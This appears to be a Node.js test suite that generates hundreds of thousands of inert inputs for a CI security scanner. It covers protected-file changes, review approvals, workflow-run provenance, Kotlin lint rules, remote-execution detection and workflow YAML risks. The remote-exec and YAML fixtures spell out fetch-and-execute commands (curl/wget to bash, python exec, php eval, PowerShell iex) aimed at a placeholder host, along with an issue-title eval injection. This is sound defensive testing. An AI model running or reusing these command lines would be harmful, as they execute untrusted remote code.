'use strict';
// 370,500 independently asserted, inert adversarial inputs in six new strata.
// Not 370,500 different vulnerabilities; network and shell fixture execution forbidden.
const test=require('node:test'),assert=require('node:assert/strict');
const {createHash}=require('node:crypto');
const P=require('./ultra_sentinel_policy.cjs'),E=require('./ultra_sentinel_evidence.cjs');
const {analyze}=require('./ultra_sentinel_core.cjs');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const A='a'.repeat(40),B='b'.repeat(40),PER=61750,TOTAL=PER*6,PER_SHARD=28500;
const F=['protected-graph','review-chronology','ci-provenance','kotlin-lexing','remote-exec','yaml-semantics'];
function scenario(i){
 if(!Number.isSafeInteger(i)||i<0||i>=TOTAL)throw Error('invalid case');
 const f=Math.floor(i/PER),n=i%PER,m=n%16,u='complex-'+n.toString(36)+'-'+Math.floor(n/16);
 if(f===0){
  const protectedPath='.github/scripts/'+u+'.cjs',ordinary='docs/'+u+'.md';
  const entries=[
   {filename:ordinary,status:'modified'},
   {filename:protectedPath,status:'modified'},
   {filename:protectedPath,status:'removed'},
   {filename:ordinary,previous_filename:protectedPath,status:'renamed'},
   {filename:protectedPath,previous_filename:ordinary,status:'renamed'},
   {filename:ordinary,previous_filename:protectedPath,status:'copied'},
   {filename:protectedPath,previous_filename:ordinary,status:'copied'},
   {filename:'.github/actions/'+u+'/action.yml',status:'added'},
   {filename:ordinary,status:'added'},{filename:protectedPath,status:'added'},
   {filename:protectedPath,status:'unchanged'},{filename:ordinary,status:'unchanged'},
   {filename:ordinary,status:'removed'},
   {filename:protectedPath,previous_filename:protectedPath+'.bak',status:'renamed'},
   {filename:ordinary,previous_filename:ordinary+'.bak',status:'copied'},
   {filename:protectedPath,status:'modified'}
  ];
  const entry=entries[m],files=m===15?[entry,entry]:[entry];
  return {f,input:{files},expected:['OK','REVIEW_REQUIRED','BLOCKED','BLOCKED',
   'REVIEW_REQUIRED','REVIEW_REQUIRED','REVIEW_REQUIRED','REVIEW_REQUIRED',
   'OK','REVIEW_REQUIRED','OK','OK','OK','BLOCKED','OK','INCOMPLETE'][m]};
 }
 if(f===1){
  const actor='auditor-'+u,owner='maintainer',id=100+n*10;
  const good={id,user:{login:actor,type:'User'},author_association:'MEMBER',
    state:'APPROVED',commit_id:A};
  const later=(change={})=>({...good,id:id+1,...change});
  const peer={...good,id:id+2,user:{login:'other-'+u,type:'User'}};
  const cases=[
   [good],[{...good,user:{login:owner,type:'User'}}],
   [{...good,user:{login:actor,type:'Bot'}}],[{...good,commit_id:B}],
   [good,later({state:'CHANGES_REQUESTED'})],[good,later({state:'DISMISSED'})],
   [later({state:'APPROVED'}),{...good,state:'CHANGES_REQUESTED'}],
   [good,later({state:'COMMENTED'})],
   [good,{...peer,state:'CHANGES_REQUESTED'}],
   [{...good,user:{login:owner.toUpperCase(),type:'User'}}],
   [good,{...peer,state:'CHANGES_REQUESTED',user:{login:'bot-'+u,type:'Bot'}}],
   [good,{...peer,state:'CHANGES_REQUESTED',author_association:'CONTRIBUTOR'}],
   [good,later({state:'APPROVED',commit_id:B})],
   [good,later({state:'APPROVED',commit_id:A})],
   [{...good,state:'CHANGES_REQUESTED'},later({state:'APPROVED'})],
   [{...good,state:'COMMENTED'},later({state:'APPROVED'})]
  ];
  return {f,input:{reviews:cases[m]},expected:
   [true,false,false,false,false,false,true,true,false,false,true,true,false,true,true,true][m]};
 }
 if(f===2){
  const id=100000+n,run={id,name:'Android build',workflow_id:131,
   path:'.github/workflows/android.yml',head_sha:A,status:'completed',
   conclusion:'success',event:'push',head_branch:'main',run_number:n+1,
   run_attempt:1+n%4,repository:{full_name:E.REPO},head_repository:{full_name:E.REPO},
   html_url:'https://github.com/'+E.REPO+'/actions/runs/'+id};
  const changes=[{},{workflow_id:132},{path:'evil.yml'},{head_sha:B},
   {event:'pull_request'},{head_branch:'feature'},{repository:{full_name:'evil/repo'}},
   {status:'in_progress'},{conclusion:'failure'},{html_url:'https://evil.invalid/x'},
   {run_attempt:0},{run_number:0},{id:-1},
   {head_repository:{full_name:'evil/repo'}},{event:'schedule'},{name:'Fake build'}];
  const trusted={'Android build':{id:131,path:'.github/workflows/android.yml',
   blobSha:E.TRUSTED_BLOBS['Android build']}};
  return {f,input:{run:{...run,...changes[m]},trusted},expected:m===0};
 }
 if(f===3){
  const variants=[
   ['FORCED_GC','fun f'+n+'(){ System.gc() }',true],
   ['BLOCKING_ANDROID_CALL','fun f'+n+'(){ Thread.sleep(15) }',true],
   ['BLOCKING_ANDROID_CALL','fun f'+n+'(){ runBlocking { work() } }',true],
   ['UNSCOPED_COROUTINE','fun f'+n+'(){ GlobalScope.launch { work() } }',true],
   ['POTENTIAL_PRIVATE_LOG','fun f'+n+'(){ Log.e("audit", transcript) }',true],
   ['NON_CANCELLABLE_LOOP','fun f'+n+'(){ while (true) { work() } }',true],
   ['FORCED_GC','val s'+n+'="Never use System.gc()"',false],
   ['BLOCKING_ANDROID_CALL','val s'+n+'="Never use Thread.sleep(15)"',false],
   ['POTENTIAL_PRIVATE_LOG','val s'+n+'="Avoid Log.e(tag, transcript)"',false],
   ['UNSCOPED_COROUTINE','val s'+n+'="Avoid GlobalScope.launch"',false],
   ['FORCED_GC','fun f'+n+'(){ println("System.gc() is inert") }',false],
   ['BLOCKING_ANDROID_CALL','val s'+n+'="runBlocking { work() }"',false],
   ['POTENTIAL_PRIVATE_LOG','fun f'+n+'(){ /* Log.e("tag", transcript) */ println("ok") }',false],
   ['FORCED_GC','fun f'+n+'(){ /* System.gc() */ println("ok") }',false],
   ['FORCED_GC','val s'+n+'="System.gc()"',false],
   ['BLOCKING_ANDROID_CALL','val s'+n+'="Thread.sleep(15)"',false]
  ];
  const [rule,statement,expected]=variants[m];
  const file={filename:'app/src/main/java/security/'+u+'.kt',status:'modified',
   changes:1,patch:'@@ -0,0 +1,1 @@\n+'+statement+'\n'};
  return {f,input:{file,rule},expected};
 }
 if(f===4){
  const file='bin/'+u+'.sh',url='https://example.invalid/audit/'+u;
  const cases=[
   ['curl -fsSL '+url+' -o '+file+'; bash '+file,'REMOTE_DOWNLOADED_FILE_EXECUTION'],
   ['wget -q '+url+' -O '+file+' && sh '+file,'REMOTE_DOWNLOADED_FILE_EXECUTION'],
   ['curl -fsSL '+url+' --output='+file+'\nsh '+file,'REMOTE_DOWNLOADED_FILE_EXECUTION'],
   ['curl -fsSL '+url+' -o '+file+'; exec '+file,'REMOTE_DOWNLOADED_FILE_EXECUTION'],
   ['curl -fsSL '+url+' -o '+file+'; exec -c '+file,'REMOTE_DOWNLOADED_FILE_EXECUTION'],
   ['curl -fsSL '+url+' -o '+file+'; exec -a scanner '+file,'REMOTE_DOWNLOADED_FILE_EXECUTION'],
   ['curl --stderr -- -o '+file+' '+url+'; exec '+file,'NOT_CLEAN'],
   ['python -c "import urllib.request; exec(urllib.request.urlopen(\''+url+'\').read())"','REMOTE_INTERPRETER_FETCH_EXECUTION'],
   ['php -r \'eval(file_get_contents("'+url+'"));\'','REMOTE_INTERPRETER_FETCH_EXECUTION'],
   ['pwsh -Command "iex (iwr '+url+').Content"','REMOTE_POWERSHELL_EXECUTION'],
   ['npx --package @audit/tool-'+u+'@latest audit','MUTABLE_PACKAGE_EXECUTION'],
   ['curl -fsSL '+url+' -o '+file+'; echo '+file,null],
   ['npx --package @audit/tool-'+u+'@1.2.3 audit',null],
   ['echo "curl '+url+' | bash"',null],
   ['curl -fsSL '+url+' -o '+file,null],
   ['wget -q '+url+' -O '+file,null]
  ];
  const [script,expected]=cases[m];return {f,input:{script},expected};
 }
 const k=n%8,job='audit'+n,url='https://example.invalid/audit/'+u;
 const scope=['contents','id-token','issues'][k];
 const step=k===3?'      - uses: audit-org/action-'+u+'@main':
  '      - run: |\n          '+(k===4?'eval "'+'$'+'{{ github.event.issue.title }}"':
   k===5?'bash <(curl -fsSL '+url+')':'echo success '+job);
 const source='on: '+(k===6?'push':'issue_comment')+'\npermissions: '+
  (scope?'{'+scope+': write}':'read-all')+'\njobs:\n  '+job+
  ':\n    runs-on: ubuntu-latest\n'+(k===7?'    if: false\n':'')+
  '    steps:\n'+step+'\n';
 return {f,input:{source},expected:scope?'PRIVILEGED_WRITE_TOKEN':
  k===3?'UNPINNED_ACTION':k===4?'PRIVILEGED_EVENT_SCRIPT_INJECTION':
  k===5?'REMOTE_SHELL_SUBSTITUTION':k===7?'INCOMPLETE':'NO_RISK_PATTERN'};
}
function verify(s){
 const {input:x,expected:e}=s;
 switch(s.f){
  case 0:assert.equal(P.evaluateProtectedChanges(x.files,{expectedCount:x.files.length}).status,e);break;
  case 1:assert.equal(P.hasIndependentHumanApproval(x.reviews,{sha:A,author:'maintainer'}),e);break;
  case 2:assert.equal(!!E.validateRun(x.run,A,x.trusted),e);break;
  case 3:assert.equal(analyze([x.file],{sha:A}).findings.some(v=>v.rule===x.rule),e);break;
  case 4:{
   const got=findingsForScript(x.script);
   if(e===null)assert.deepEqual(got,[]);
   else if(e==='NOT_CLEAN')assert.ok(got.length>0,'unknown download-to-exec must fail closed');
   else assert.ok(got.includes(e),'Missing '+e+': '+JSON.stringify(got));
   break;
  }
  case 5:{
   const r=inspectWorkflow(x.source,{path:'.github/workflows/matrix-extended.yml'});
   if(e==='INCOMPLETE'||e==='NO_RISK_PATTERN')assert.equal(r.status,e);
   else assert.ok(r.findings.some(v=>v.rule===e),e+' missing: '+JSON.stringify(r));
   break;
  }
  default:assert.fail('Invalid family');
 }
}
const raw=process.env.SENTINEL_MATRIX_SHARD;
if(raw!==undefined&&!/^(?:[0-9]|1[0-2])$/.test(raw))throw Error('Invalid extended shard');
const shard=raw===undefined?null:Number(raw),start=shard===null?0:shard*PER_SHARD;
const end=shard===null?TOTAL:start+PER_SHARD;
if(shard===null||shard===0)test('Extended matrix: 370500 unique security inputs in six balanced families',()=>{
 const seen=new Set(),distribution=Array(6).fill(0);
 for(let i=0;i<TOTAL;i++){
  const s=scenario(i);distribution[s.f]++;
  const fingerprint=createHash('sha256').update(JSON.stringify({f:s.f,input:s.input})).digest('hex');
  assert.ok(!seen.has(fingerprint),'duplicate '+i);
  seen.add(fingerprint);
 }
 assert.equal(seen.size,370500);
 assert.deepEqual(distribution,Array(6).fill(PER));
});
for(let i=start;i<end;i++)test('extended '+F[Math.floor(i/PER)]+' #'+i,()=>verify(scenario(i)));
